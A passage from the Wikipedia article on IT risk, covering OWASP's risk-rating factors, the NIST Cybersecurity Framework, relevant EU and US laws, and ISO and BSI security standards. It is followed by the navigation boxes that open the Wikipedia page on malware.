There can be more than one consequence from one event.
Consequences can range from positive to negative.
Consequences can be expressed qualitatively or quantitatively (ISO/IEC Guide 73)
The risk R is the product of the likelihood L of a security incident occurring times the impact I that will be incurred to the organization due to the incident, that is:[22]

R = L × I
The likelihood of a security incident occurrence is a function of the likelihood that a threat appears and the likelihood that the threat can successfully exploit the relevant system vulnerabilities.
The consequence of the occurrence of a security incident are a function of likely impact that the incident will have on the organization as a result of the harm the organization assets will sustain. Harm is related to the value of the assets to the organization; the same asset can have different values to different organizations.
So R can be function of four factors:

A = Value of the assets
T = the likelihood of the threat
V = the nature of vulnerability i.e. the likelihood that can be exploited (proportional to the potential benefit for the attacker and inversely proportional to the cost of exploitation)
I = the likely impact, the extent of the harm
If numerical values (money for impact and probabilities for the other factors), the risk can be expressed in monetary terms and compared to the cost of countermeasures and the residual risk after applying the security control. It is not always practical to express this values, so in the first step of risk evaluation, risk are graded dimensionless in three or five steps scales.
OWASP proposes a practical risk measurement guideline[22] based on:

Estimation of Likelihood as a mean between different factors in a 0 to 9 scale:
Threat agent factors
Skill level: How technically skilled is this group of threat agents? No technical skills (1), some technical skills (3), advanced computer user (4), network and programming skills (6), security penetration skills (9)
Motive: How motivated is this group of threat agents to find and exploit this vulnerability? Low or no reward (1), possible reward (4), high reward (9)
Opportunity: What resources and opportunity are required for this group of threat agents to find and exploit this vulnerability? full access or expensive resources required (0), special access or resources required (4), some access or resources required (7), no access or resources required (9)
Size: How large is this group of threat agents? Developers (2), system administrators (2), intranet users (4), partners (5), authenticated users (6), anonymous Internet users (9)
Vulnerability Factors: the next set of factors are related to the vulnerability involved. The goal here is to estimate the likelihood of the particular vulnerability involved being discovered and exploited. Assume the threat agent selected above.
Ease of discovery: How easy is it for this group of threat agents to discover this vulnerability? Practically impossible (1), difficult (3), easy (7), automated tools available (9)
Ease of exploit: How easy is it for this group of threat agents to actually exploit this vulnerability? Theoretical (1), difficult (3), easy (5), automated tools available (9)
Awareness: How well known is this vulnerability to this group of threat agents? Unknown (1), hidden (4), obvious (6), public knowledge (9)
Intrusion detection: How likely is an exploit to be detected? Active detection in application (1), logged and reviewed (3), logged without review (8), not logged (9)
Estimation of Impact as a mean between different factors in a 0 to 9 scale
Technical Impact Factors; technical impact can be broken down into factors aligned with the traditional security areas of concern: confidentiality, integrity, availability, and accountability. The goal is to estimate the magnitude of the impact on the system if the vulnerability were to be exploited.
Loss of confidentiality: How much data could be disclosed and how sensitive is it? Minimal non-sensitive data disclosed (2), minimal critical data disclosed (6), extensive non-sensitive data disclosed (6), extensive critical data disclosed (7), all data disclosed (9)
Loss of integrity: How much data could be corrupted and how damaged is it? Minimal slightly corrupt data (1), minimal seriously corrupt data (3), extensive slightly corrupt data (5), extensive seriously corrupt data (7), all data totally corrupt (9)
Loss of availability How much service could be lost and how vital is it? Minimal secondary services interrupted (1), minimal primary services interrupted (5), extensive secondary services interrupted (5), extensive primary services interrupted (7), all services completely lost (9)
Loss of accountability: Are the threat agents' actions traceable to an individual? Fully traceable (1), possibly traceable (7), completely anonymous (9)
Business Impact Factors: The business impact stems from the technical impact, but requires a deep understanding of what is important to the company running the application. In general, you should be aiming to support your risks with business impact, particularly if your audience is executive level. The business risk is what justifies investment in fixing security problems.
Financial damage: How much financial damage will result from an exploit? Less than the cost to fix the vulnerability (1), minor effect on annual profit (3), significant effect on annual profit (7), bankruptcy (9)
Reputation damage: Would an exploit result in reputation damage that would harm the business? Minimal damage (1), Loss of major accounts (4), loss of goodwill (5), brand damage (9)
Non-compliance: How much exposure does non-compliance introduce? Minor violation (2), clear violation (5), high-profile violation (7)
Privacy violation: How much personally identifiable information could be disclosed? One individual (3), hundreds of people (5), thousands of people (7), millions of people (9)
If the business impact is calculated accurately use it in the following otherwise use the Technical impact
Rate likelihood and impact in a LOW, MEDIUM, HIGH scale assuming that less than 3 is LOW, 3 to less than 6 is MEDIUM, and 6 to 9 is HIGH.
Calculate the risk using the following table


Overall Risk Severity


Impact

HIGH

Medium

High

Critical


MEDIUM

Low

Medium

High


LOW

None

Low

Medium


 

LOW

MEDIUM

HIGH


 

Likelihood

IT risk management[edit]
 Risk Management Elements
Main article: IT risk management
IT risk management can be considered a component of a wider enterprise risk management system.[23]
The establishment, maintenance and continuous update of an information security management system (ISMS) provide a strong indication that a company is using a systematic approach for the identification, assessment and management of information security risks.[24]
Different methodologies have been proposed to manage IT risks, each of them divided into processes and steps.[25]
The Certified Information Systems Auditor Review Manual 2006 produced by ISACA, an international professional association focused on IT Governance, provides the following definition of risk management: "Risk management is the process of identifying vulnerabilities and threats to the information resources used by an organization in achieving business objectives, and deciding what countermeasures, if any, to take in reducing risk to an acceptable level, based on the value of the information resource to the organization."[26]
The NIST Cybersecurity Framework encourages organizations to manage IT risk as part the Identify (ID) function:[27][28]
Risk Assessment (ID.RA): The organization understands the cybersecurity risk to organizational operations (including mission, functions, image, or reputation), organizational assets, and individuals.

ID.RA-1: Asset vulnerabilities are identified and documented
ID.RA-2: Cyber threat intelligence and vulnerability information is received from information sharing forums and source
ID.RA-3: Threats, both internal and external, are identified and documented
ID.RA-4: Potential business impacts and likelihoods are identified
ID.RA-5: Threats, vulnerabilities, likelihoods, and impacts are used to determine risk
ID.RA-6: Risk responses are identified and prioritized
Risk Management Strategy (ID.RM): The organization’s priorities, constraints, risk tolerances, and assumptions are established and used to support operational risk decisions. 

ID.RM-1: Risk management processes are established, managed, and agreed to by organizational stakeholders
ID.RM-2: Organizational risk tolerance is determined and clearly expressed
ID.RM-3: The organization’s determination of risk tolerance is informed by its role in critical infrastructure and sector specific risk analysis
IT risk laws and regulations[edit]
In the following a brief description of applicable rules organized by source.[29]

OECD[edit]
OECD issued the following:

Organisation for Economic Co-operation and Development (OECD) Recommendation of the Council concerning guidelines governing the protection of privacy and trans-border flows of personal data (23 September 1980)
OECD Guidelines for the Security of Information Systems and Networks: Towards a Culture of Security (25 July 2002). Topic: General information security. Scope: Non binding guidelines to any OECD entities (governments, businesses, other organisations and individual users who develop, own, provide, manage, service, and use information systems and networks). The OECD Guidelines state the basic principles underpinning risk management and information security practices. While no part of the text is binding as such, non-compliance with any of the principles is indicative of a serious breach of RM/RA good practices that can potentially incur liability.
European Union[edit]
The European Union issued the following, divided by topic:

Privacy
Regulation (EC) No 45/2001 on the protection of individuals with regard to the processing of personal data by the Community institutions and bodies and on the free movement of such data provide an internal regulation, which is a practical application of the principles of the Privacy Directive described below. Furthermore, article 35 of the Regulation requires the Community institutions and bodies to take similar precautions with regard to their telecommunications infrastructure, and to properly inform the users of any specific risks of security breaches.
Directive 95/46/EC on the protection of individuals with regard to the processing of personal data and on the free movement of such data require that any personal data processing activity undergoes a prior risk analysis in order to determine the privacy implications of the activity, and to determine the appropriate legal, technical and organisation measures to protect such activities;is effectively protected by such measures, which must be state of the art keeping into account the sensitivity and privacy implications of the activity (including when a third party is charged with the processing task) is notified to a national data protection authority, including the measures taken to ensure the security of the activity. Furthermore, article 25 and following of the Directive requires Member States to ban the transfer of personal data to non-Member States, unless such countries have provided adequate legal protection for such personal data, or barring certain other exceptions.
Commission Decision 2001/497/EC of 15 June 2001 on standard contractual clauses for the transfer of personal data to third countries, under Directive 95/46/EC; and Commission Decision 2004/915/EC of 27 December 2004 amending Decision 2001/497/EC as regards the introduction of an alternative set of standard contractual clauses for the transfer of personal data to third countries. Topic: Export of personal data to third countries, specifically non-E.U. countries which have not been recognised as having a data protection level that is adequate (i.e. equivalent to that of the E.U.). Both Commission Decisions provide a set of voluntary model clauses which can be used to export personal data from a data controller (who is subject to E.U. data protection rules) to a data processor outside the E.U. who is not subject to these rules or to a similar set of adequate rules.
International Safe Harbor Privacy Principles (see below USA and International Safe Harbor Privacy Principles )
Directive 2002/58/EC of 12 July 2002 concerning the processing of personal data and the protection of privacy in the electronic communications sector
National Security
Directive 2006/24/EC of 15 March 2006 on the retention of data generated or processed in connection with the provision of publicly available electronic communications services or of public communications networks and amending Directive 2002/58/EC (‘Data Retention Directive’). Topic: Requirement for the providers of public electronic telecommunications service providers to retain certain information for the purposes of the investigation, detection and prosecution of serious crime
Council Directive 2008/114/EC of 8 December 2008 on the identification and designation of European critical infrastructures and the assessment of the need to improve their protection. Topic: Identification and protection of European Critical Infrastructures. Scope: Applicable to Member States and to the operators of European Critical Infrastructure (defined by the draft directive as ‘critical infrastructures the disruption or destruction of which would significantly affect two or more Member States, or a single Member State if the critical infrastructure is located in another Member State. This includes effects resulting from cross-sector dependencies on other types of infrastructure’). Requires Member States to identify critical infrastructures on their territories, and to designate them as ECIs. Following this designation, the owners/operators of ECIs are required to create Operator Security Plans (OSPs), which should establish relevant security solutions for their protection
Civil and Penal law
Council Framework Decision 2005/222/JHA of 24 February 2005 on attacks against information systems. Topic: General decision aiming to harmonise national provisions in the field of cyber crime, encompassing material criminal law (i.e. definitions of specific crimes), procedural criminal law (including investigative measures and international cooperation) and liability issues. Scope: Requires Member States to implement the provisions of the Framework Decision in their national legal frameworks. Framework decision is relevant to RM/RA because it contains the conditions under which legal liability can be imposed on legal entities for conduct of certain natural persons of authority within the legal entity. Thus, the Framework decision requires that the conduct of such figures within an organisation is adequately monitored, also because the Decision states that a legal entity can be held liable for acts of omission in this regard.
Council of Europe[edit]
Council of Europe Convention on Cybercrime, Budapest, 23.XI.2001, European Treaty Series-No. 185. Topic: General treaty aiming to harmonise national provisions in the field of cyber crime, encompassing material criminal law (i.e. definitions of specific crimes), procedural criminal law (including investigative measures and international cooperation), liability issues and data retention. Apart from the definitions of a series of criminal offences in articles 2 to 10, the Convention is relevant to RM/RA because it states the conditions under which legal liability can be imposed on legal entities for conduct of certain natural persons of authority within the legal entity. Thus, the Convention requires that the conduct of such figures within an organisation is adequately monitored, also because the Convention states that a legal entity can be held liable for acts of omission in this regard.
United States[edit]
United States issued the following, divided by topic:

Civil and Penal law
Amendments to the Federal Rules of Civil Procedure with regard to electronic discovery. Topic: U.S. Federal rules with regard to the production of electronic documents in civil proceedings. The discovery rules allow a party in civil proceedings to demand that the opposing party produce all relevant documentation (to be defined by the requesting party) in its possession, so as to allow the parties and the court to correctly assess the matter. Through the e-discovery amendment, which entered into force on 1 December 2006, such information may now include electronic information. This implies that any party being brought before a U.S. court in civil proceedings can be asked to produce such documents, which includes finalised reports, working documents, internal memos and e-mails with regard to a specific subject, which may or may not be specifically delineated. Any party whose activities imply a risk of being involved in such proceedings must therefore take adequate precautions for the management of such information, including the secure storage. Specifically: The party must be capable of initiating a ‘litigation hold’, a technical/organisational measure which must ensure that no relevant information can be modified any longer in any way. Storage policies must be responsible: while deletion of specific information of course remains allowed when this is a part of general information management policies (‘routine, good-faith operation of the information system’, Rule 37 (f)), the wilful destruction of potentially relevant information can be punished by extremely high fines (in one specific case of 1.6 billion US$). Thus, in practice, any businesses who risk civil litigation before U.S. courts must implement adequate information management policies, and must implement the necessary measures to initiate a litigation hold.
Privacy
California Consumer Privacy Act (CCPA)
California Privacy Rights Act (CPRA)
Gramm–Leach–Bliley Act (GLBA)
USA PATRIOT Act, Title III
Health Insurance Portability and Accountability Act (HIPAA) From an RM/RA perspective, the Act is particularly known for its provisions with regard to Administrative Simplification (Title II of HIPAA). This title required the U.S. Department of Health and Human Services (HHS) to draft specific rule sets, each of which would provide specific standards which would improve the efficiency of the health care system and prevent abuse. As a result, the HHS has adopted five principal rules: the Privacy Rule, the Transactions and Code Sets Rule, the Unique Identifiers Rule, the Enforcement Rule, and the Security Rule. The latter, published in the Federal Register on 20 February 2003 (see: http://www.cms.hhs.gov/SecurityStandard/Downloads/securityfinalrule.pdf), is specifically relevant, as it specifies a series of administrative, technical, and physical security procedures to assure the confidentiality of electronic protected health information. These aspects have been further outlined in a set of Security Standards on Administrative, Physical, Organisational and Technical Safeguards, all of which have been published, along with a guidance document on the basics of HIPAA risk management and risk assessment <http://www.cms.hhs.gov/EducationMaterials/04_SecurityMaterials.asp>. European or other countries health care service providers will generally not be affected by HIPAA obligations if they are not active on the U.S. market. However, since their data processing activities are subject to similar obligations under general European law (including the Privacy Directive), and since the underlying trends of modernisation and evolution towards electronic health files are the same, the HHS safeguards can be useful as an initial yardstick for measuring RM/RA strategies put in place by European health care service providers, specifically with regard to the processing of electronic health information. HIPAA security standards include the following:
Administrative safeguards:
Security Management Process
Assigned Security Responsibility
Workforce Security
Information Access Management
Security Awareness and Training
Security Incident Procedures
Contingency Plan
Evaluation
Business Associate Contracts and Other Arrangements
Physical safeguards
Facility Access Controls
Workstation Use
Workstation Security
Device and Media Controls
Technical safeguards
Access Control
Audit Controls
Integrity
Person or Entity Authentication
Transmission Security
Organisational requirements
Business Associate Contracts & Other Arrangements
Requirements for Group Health Plans
International Safe Harbor Privacy Principles issued by the US Department of Commerce on July 21, 2000 Export of personal data from a data controller who is subject to E.U. privacy regulations to a U.S. based destination; before personal data may be exported from an entity subject to E.U. privacy regulations to a destination subject to U.S. law, the European entity must ensure that the receiving entity provides adequate safeguards to protect such data against a number of mishaps. One way of complying with this obligation is to require the receiving entity to join the Safe Harbor, by requiring that the entity self-certifies its compliance with the so-called Safe Harbor Principles. If this road is chosen, the data controller exporting the data must verify that the U.S. destination is indeed on the Safe Harbor list (see safe harbor list)
The United States Department of Homeland Security also utilizes Privacy Impact Assessment (PIA) as a decision making tool to identify and mitigate risks of privacy violations.[30]
Sarbanes–Oxley Act
FISMA

As legislation evolves, there has been increased focus to require 'reasonable security' for information management. CCPA states that "manufacturers of connected devices to equip the device with reasonable security."[31] New York's SHIELD Act requires that organizations that manage NY residents' information “develop, implement and maintain reasonable safeguards to protect the security, confidentiality and integrity of the private information including, but not limited to, disposal of data.” This concept will influence how businesses manage their risk management plan as compliance requirements develop.

Standards organizations and standards[edit]
International standard bodies:
International Organization for Standardization – ISO
Payment Card Industry Security Standards Council
Information Security Forum
The Open Group
United States standard bodies:
National Institute of Standards and Technology – NIST
Federal Information Processing Standards – FIPS by NIST devoted to Federal Government and Agencies
UK standard bodies
British Standard Institute
Short description of standards[edit]
The list is chiefly based on:[29]

ISO[edit]
ISO/IEC 13335-1:2004 – Information technology—Security techniques—Management of information and communications technology security—Part 1: Concepts and models for information and communications technology security management http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=39066. Standard containing generally accepted descriptions of concepts and models for information and communications technology security management. The standard is a commonly used code of practice, and serves as a resource for the implementation of security management practices and as a yardstick for auditing such practices. (See also http://csrc.nist.gov/publications/secpubs/otherpubs/reviso-faq.pdf)
ISO/IEC TR 15443-1:2005 – Information technology—Security techniques—A framework for IT security assurance reference:http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=39733 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Security assurance – the Technical Report (TR) contains generally accepted guidelines which can be used to determine an appropriate assurance method for assessing a security service, product or environmental factor
ISO/IEC 15816:2002 – Information technology—Security techniques—Security information objects for access control reference:http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=29139 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Security management – Access control. The standard allows security professionals to rely on a specific set of syntactic definitions and explanations with regard to SIOs, thus avoiding duplication or divergence in other standardisation efforts.
ISO/IEC TR 15947:2002 – Information technology—Security techniques—IT intrusion detection framework reference:http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=29580 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Security management – Intrusion detection in IT systems. The standard allows security professionals to rely on a specific set of concepts and methodologies for describing and assessing security risks with regard to potential intrusions in IT systems. It does not contain any RM/RA obligations as such, but it is rather a tool for facilitating RM/RA activities in the affected field.
ISO/IEC 15408-1/2/3:2005 – Information technology — Security techniques — Evaluation criteria for IT security — Part 1: Introduction and general model (15408-1) Part 2: Security functional requirements (15408-2) Part 3: Security assurance requirements (15408-3) reference: http://isotc.iso.org/livelink/livelink/fetch/2000/2489/Ittf_Home/PubliclyAvailableStandards.htm Topic: Standard containing a common set of requirements for the security functions of IT products and systems and for assurance measures applied to them during a security evaluation. Scope: Publicly available ISO standard, which can be voluntarily implemented. The text is a resource for the evaluation of the security of IT products and systems, and can thus be used as a tool for RM/RA. The standard is commonly used as a resource for the evaluation of the security of IT products and systems; including (if not specifically) for procurement decisions with regard to such products. The standard can thus be used as an RM/RA tool to determine the security of an IT product or system during its design, manufacturing or marketing, or before procuring it.
ISO/IEC 17799:2005 – Information technology—Security techniques—Code of practice for information security management. reference: http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=39612&ICS1=35&ICS2=40&ICS3= (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Standard containing generally accepted guidelines and general principles for initiating, implementing, maintaining, and improving information security management in an organization, including business continuity management. The standard is a commonly used code of practice, and serves as a resource for the implementation of information security management practices and as a yardstick for auditing such practices. (See also ISO/IEC 17799)
ISO/IEC TR 15446:2004 – Information technology—Security techniques—Guide for the production of Protection Profiles and Security Targets. reference: http://isotc.iso.org/livelink/livelink/fetch/2000/2489/Ittf_Home/PubliclyAvailableStandards.htm Topic: Technical Report (TR) containing guidelines for the construction of Protection Profiles (PPs) and Security Targets (STs) that are intended to be compliant with ISO/IEC 15408 (the "Common Criteria"). The standard is predominantly used as a tool for security professionals to develop PPs and STs, but can also be used to assess the validity of the same (by using the TR as a yardstick to determine if its standards have been obeyed). Thus, it is a (nonbinding) normative tool for the creation and assessment of RM/RA practices.
ISO/IEC 18028:2006 – Information technology—Security techniques—IT network security reference: http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=40008 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Five part standard (ISO/IEC 18028-1 to 18028-5) containing generally accepted guidelines on the security aspects of the management, operation and use of information technology networks. The standard is considered an extension of the guidelines provided in ISO/IEC 13335 and ISO/IEC 17799 focusing specifically on network security risks. The standard is a commonly used code of practice, and serves as a resource for the implementation of security management practices and as a yardstick for auditing such practices.
ISO/IEC 27001:2005 – Information technology—Security techniques—Information security management systems—Requirements reference: http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=42103 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Standard containing generally accepted guidelines for the implementation of an Information Security Management System within any given organisation. Scope: Not publicly available ISO standard, which can be voluntarily implemented. While not legally binding, the text contains direct guidelines for the creation of sound information security practices The standard is a very commonly used code of practice, and serves as a resource for the implementation of information security management systems and as a yardstick for auditing such systems and/or the surrounding practices. Its application in practice is often combined with related standards, such as BS 7799-3:2006 which provides additional guidance to support the requirements given in ISO/IEC 27001:2005 <http://www.bsiglobal.com/en/Shop/Publication-Detail/?pid=000000000030125022&recid=2491>
ISO/IEC 27001:2013, the updated standard for information security management systems.
ISO/IEC TR 18044:2004 – Information technology—Security techniques—Information security incident management reference: http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=35396 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Technical Report (TR) containing generally accepted guidelines and general principles for information security incident management in an organization.Scope: Not publicly available ISO TR, which can be voluntarily used.While not legally binding, the text contains direct guidelines for incident management. The standard is a high level resource introducing basic concepts and considerations in the field of incident response. As such, it is mostly useful as a catalyst to awareness raising initiatives in this regard.
ISO/IEC 18045:2005 – Information technology—Security techniques—Methodology for IT security evaluation reference: http://isotc.iso.org/livelink/livelink/fetch/2000/2489/Ittf_Home/PubliclyAvailableStandards.htm Topic: Standard containing auditing guidelines for assessment of compliance with ISO/IEC 15408 (Information technology—Security techniques—Evaluation criteria for IT security) Scope Publicly available ISO standard, to be followed when evaluating compliance with ISO/IEC 15408 (Information technology—Security techniques—Evaluation criteria for IT security). The standard is a ‘companion document’, which is thus primarily of used for security professionals involved in evaluating compliance with ISO/IEC 15408 (Information technology—Security techniques—Evaluation criteria for IT security). Since it describes minimum actions to be performed by such auditors, compliance with ISO/IEC 15408 is impossible if ISO/IEC 18045 has been disregarded.
ISO/TR 13569:2005 – Financial services—Information security guidelines reference: http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=37245 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Standard containing guidelines for the implementation and assessment of information security policies in financial services institutions. The standard is a commonly referenced guideline, and serves as a resource for the implementation of information security management programmes in institutions of the financial sector, and as a yardstick for auditing such programmes. (See also http://csrc.nist.gov/publications/secpubs/otherpubs/reviso-faq.pdf)
ISO/IEC 21827:2008 – Information technology—Security techniques—Systems Security Engineering—Capability Maturity Model (SSE-CMM): ISO/IEC 21827:2008 specifies the Systems Security Engineering – Capability Maturity Model (SSE-CMM), which describes the essential characteristics of an organization's security engineering process that must exist to ensure good security engineering. ISO/IEC 21827:2008 does not prescribe a particular process or sequence, but captures practices generally observed in industry. The model is a standard metric for security engineering practices.
BSI[edit]
BS 25999-1:2006 – Business continuity management Part 1: Code of practice Note: this is only part one of BS 25999, which was published in November 2006. Part two (which should contain more specific criteria with a view of possible accreditation) is yet to appear. reference: http://www.bsi-global.com/en/Shop/Publication-Detail/?pid=000000000030157563. Topic: Standard containing a business continuity code of practice. The standard is intended as a code of practice for business continuity management, and will be extended by a second part that should permit accreditation for adherence with the standard. Given its relative newness, the potential impact of the standard is difficult to assess, although it could be very influential to RM/RA practices, given the general lack of universally applicable standards in this regard and the increasing attention to business continuity and contingency planning in regulatory initiatives. Application of this standard can be complemented by other norms, in particular PAS 77:2006 – IT Service Continuity Management Code of Practice <http://www.bsi-global.com/en/Shop/Publication-Detail/?pid=000000000030141858>.The TR allows security professionals to determine a suitable methodology for assessing a security service, product or environmental factor (a deliverable). Following this TR, it can be determined which level of security assurance a deliverable is intended to meet, and if this threshold is actually met by the deliverable.
BS 7799-3:2006 – Information security management systems—Guidelines for information security risk management reference: http://www.bsi-global.com/en/Shop/Publication-Detail/?pid=000000000030125022&recid=2491 (Note: this is a reference to the BSI page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Standard containing general guidelines for information security risk management.Scope: Not publicly available BSI standard, which can be voluntarily implemented. While not legally binding, the text contains direct guidelines for the creation of sound information security practices. The standard is mostly intended as a guiding complementary document to the application of the aforementioned ISO 27001:2005, and is therefore typically applied in conjunction with this standard in risk assessment practices
Information Security Forum[edit]
Standard of Good Practice
See also[edit]

Business_and_economics portal

Asset (computer security)
Availability
BS 7799
BS 25999
Committee on National Security Systems
Common Criteria
Confidentiality
Cyber-security regulation
Data Protection Directive
Electrical disruptions caused by squirrels
Exploit (computer security)
Factor analysis of information risk
Federal Information Security Management Act of 2002
Gramm–Leach–Bliley Act
Health Insurance Portability and Accountability Act
Information security
Information Security Forum
Information technology
Integrity
International Safe Harbor Privacy Principles
ISACA
ISO
ISO/IEC 27000-series
ISO/IEC 27001:2013
ISO/IEC 27002
IT risk management
Long-term support
National Information Assurance Training and Education Center
National Institute of Standards and Technology
National security
OWASP
Patriot Act, Title III
Privacy
Risk
Risk factor (computing)
Risk IT
Sarbanes–Oxley Act
Standard of Good Practice
Threat (computer)
Vulnerability

References[edit]


^ "What is IT risk? | nibusinessinfo.co.uk". www.nibusinessinfo.co.uk. Retrieved 2021-09-04.

^ "Risk is a combination of the likelihood of an occurrence of a hazardous event or exposure(s) and the severity of injury or ill health that can be caused by the event or exposure(s)" (OHSAS 18001:2007)

^ "3 Types Of Cybersecurity Assessments – Threat Sketch". Threat Sketch. 2016-05-16. Archived from the original on 2018-11-07. Retrieved 2017-10-07.

^ "Information Security Assessment Types". danielmiessler.com. Retrieved 2017-10-07.

^ a b c ISO/IEC, "Information technology – Security techniques-Information security risk management" ISO/IEC FIDIS 27005:2008

^ CNSS Instruction No. 4009 Archived 2012-02-27 at the Wayback Machine dated 26 April 2010

^ National Information Assurance Certification and Accreditation Process (NIACAP) by National Security Telecommunications and Information Systems Security Committee

^ "Glossary of Terms". Retrieved 23 May 2016.

^ a wiki project devoted to FISMA

^ FISMApedia Risk term

^ a b NIST SP 800-30 Risk Management Guide for Information Technology Systems

^ FIPS Publication 200 Minimum Security Requirements for Federal Information and Information Systems

^ a b FAIR: Factor Analysis for Information Risks Archived 2014-11-18 at the Wayback Machine

^ a b ISACA THE RISK IT FRAMEWORK Archived 2010-07-05 at the Wayback Machine ISBN 978-1-60420-111-6 (registration required)

^ Technical Standard Risk Taxonomy ISBN 1-931624-77-1 Document Number: C081 Published by The Open Group, January 2009.

^ Arnold, Rob (2017). Cybersecurity: A Business Solution: An executive perspective on managing cyber risk. Threat Sketch, LLC. ISBN 9780692944158.

^ Arnold, Rob (2017). Cybersecurity: A Business Solution. p. 22. ISBN 978-0692944158.

^ "Glossary". Archived from the original on 29 February 2012. Retrieved 23 May 2016.

^ "Glossary". Archived from the original on 29 February 2012. Retrieved 23 May 2016.

^ "Glossary". Archived from the original on 29 February 2012. Retrieved 23 May 2016.

^ "Glossary". Archived from the original on 29 February 2012. Retrieved 23 May 2016.

^ a b "OWASP Risk Rating Methodology". Retrieved 23 May 2016.

^ "ISACA THE RISK IT FRAMEWORK (registration required)" (PDF). Archived from the original (PDF) on 2010-07-05. Retrieved 2010-12-14.

^ Enisa Risk management, Risk assessment inventory, page 46

^ Katsicas, Sokratis K. (2009). "35".  In Vacca, John (ed.). Computer and Information Security Handbook. Morgan Kaufmann Publications. Elsevier Inc. p. 605. ISBN 978-0-12-374354-1.

^ 
ISACA (2006). CISA Review Manual 2006. Information Systems Audit and Control Association. p. 85. ISBN 978-1-933284-15-6.

^ Keller, Nicole (2013-11-12). "Cybersecurity Framework". NIST. Retrieved 2017-10-07.

^ Arnold, Rob. "A 10 Minute Guide to the NIST Cybersecurity Framework". Threat Sketch. Archived from the original on 2021-04-14. Retrieved 2018-02-14.

^ a b Risk Management / Risk Assessment in European regulation, international guidelines and codes of practice Archived 2011-07-23 at the Wayback Machine Conducted by the Technical Department of ENISA Section Risk Management in cooperation with: Prof. J. Dumortier and Hans Graux www.lawfort.be June 2007

^ "Privacy Impact Assessments". Department of Homeland Security. 2009-07-06. Retrieved 2020-12-12.

^ IAPP. "The evolution of the 'reasonable security' standard in the US context".{{cite web}}:  CS1 maint: url-status (link)


External links[edit]
Internet2 Information Security Guide: Effective Practices and Solutions for Higher Education
Risk Management – Principles and Inventories for Risk Management / Risk Assessment methods and tools, Publication date: Jun 01, 2006 Authors:Conducted by the Technical Department of ENISA Section Risk Management
Clusif Club de la Sécurité de l'Information Français
800-30 NIST Risk Management Guide
800-39 NIST DRAFT Managing Risk from Information Systems: An Organizational Perspective
FIPS Publication 199, Standards for Security Categorization of Federal Information and Information
FIPS Publication 200 Minimum Security Requirements for Federal Information and Information Systems
800-37 NIST Guide for Applying the Risk Management Framework to Federal Information Systems: A Security Life Cycle Approach
FISMApedia is a collection of documents and discussions focused on USA Federal IT security
Duty of Care Risk Analysis Standard (DoCRA)




Retrieved from "https://en.wikipedia.org/w/index.php?title=IT_risk&oldid=1133854803"
Categories: Data securityIT risk managementRisk analysisSecuritySecurity complianceOperational riskHidden categories: Webarchive template wayback linksCS1 maint: url-statusArticles with short descriptionShort description is different from Wikidata
 



From Wikipedia, the free encyclopedia


Malicious software


Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Part of a series onComputer hacking
History
Phreaking
Cryptovirology
Hacking of consumer electronics
List of hackers

Hacker culture and ethic
Hackathon
Hacker Manifesto
Hackerspace
Hacktivism
Maker culture
Types of hackers
Black hat
Grey hat
White hat

Conferences
Black Hat Briefings
Chaos Communication Congress
DEF CON
Hackers on Planet Earth
Security BSides
ShmooCon
Summercon

Computer crime
Crimeware
List of computer criminals
Script kiddie

Hacking tools
Exploit
forensics-focused operating systems
Payload
Social engineering
Vulnerability

Practice sites
HackThisSite
Zone-H

Malware
Rootkit
Backdoor
Trojan horse
Virus
Worm
Spyware
Ransomware
Logic bomb
Botnet
Keystroke logging
HIDS
Web shell
RCE

Computer security
Application security
